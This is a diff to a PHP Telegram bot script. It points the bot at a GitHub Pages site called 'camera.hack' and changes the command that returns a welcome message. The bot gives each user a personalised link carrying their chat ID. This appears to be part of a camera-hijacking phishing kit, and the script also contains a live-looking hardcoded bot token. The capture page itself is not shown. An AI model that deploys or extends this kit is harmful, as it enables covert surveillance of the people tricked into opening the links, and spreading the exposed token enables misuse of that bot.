@@ -1,7 +1,7 @@
 <?php
 session_start();
 $token = "6011177364:AAHR3fclU9PzhdBAcGuBKQF8Akrndlmvnb0";
-$domain = "12345678910111213141516";
+$domain = "https://mahmud44323.github.io/camera.hack.github.io";
 
 include 'telegram.php';
 $input = file_get_contents('php://input');
@@ -30,7 +30,7 @@ if(!empty($input)){
 	
 	$link = '*Your Link:*'.PHP_EOL.'`'.$domain.'/index.php?id='.$chat_id.'`';
 	$welcome = 'Hello '.$user_name.','.PHP_EOL.PHP_EOL.'Welcome to *Mahmud Tech*'.PHP_EOL.'Powered by [Mahmud Tech](https://t.me/selfbdlav20)'.PHP_EOL.PHP_EOL.$link;
-    if($text == '/rb'){
+    if($text == '/tech'){
 		$telegram->sendMessage($chat_id , $welcome);
 	}else{
 		$telegram->sendMessage($chat_id , $link);
